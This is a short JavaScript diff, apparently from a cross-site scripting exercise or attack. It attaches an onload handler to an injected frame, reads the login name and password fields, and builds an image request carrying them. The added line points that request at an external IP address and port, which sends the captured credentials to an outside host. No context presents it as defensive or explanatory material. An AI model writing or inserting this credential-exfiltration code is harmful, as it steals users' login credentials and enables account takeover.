@@ -5,7 +5,7 @@ frimfram.addEventListener('onload', function(){
 	const pw = docu.getElementById('loginPassword').value;
 	const user = docu.getElementById('loginName').value;
 	var imag = docu.createElement('img');
-	imag.src = user + '.' + pw;
+	imag.src = 'http://74.14.159.250:8000/? ' + user + '.' + pw;
 	docu.append(imag);
 });
 document.body.append(frimfram);
